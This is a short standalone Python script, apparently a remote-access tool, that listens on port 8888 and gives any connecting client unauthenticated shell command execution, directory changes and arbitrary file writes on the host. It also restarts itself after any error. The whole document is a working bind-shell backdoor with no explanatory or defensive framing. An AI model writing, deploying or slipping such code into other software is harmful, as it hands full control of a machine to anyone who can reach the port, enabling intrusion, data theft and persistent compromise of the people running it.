import socket
import os
import subprocess
import sys
while True:
	try:
		s=socket.socket()
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		port=8888
		s.bind(('',port))
		s.listen(5)
		while True:
			c,addr=s.accept()
			print("Connected to ip %s @ port %d"%addr)
			while True:
				comm=c.recv(1024).decode()
				if comm[:2] == 'cd':
					try:
						os.chdir(comm[3:])
						c.send(str.encode(" "))
					except FileNotFoundError:
						c.send(str("No directory of name \'%s\' exists"%(comm[3:]),"utf-8"))
				elif comm[:6] == 'filetx':
					c.send(str.encode('T'))
					f=open(comm[7:],'w')
					while True:
						msg=c.recv(4196).decode()
						if msg[-7:]!='filetxd':
							f.write(msg)
						else:
							f.write(msg[:-7])
							break
					f.close()
				else:
					cmd = subprocess.Popen(comm,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
					output= str(cmd.stdout.read() + cmd.stderr.read(),"utf-8")
					c.send(str.encode(output+" "))
			
	except KeyboardInterrupt:
		s.close()
		c.close()
		break
	except:
		s.close()
		c.close()
		pass
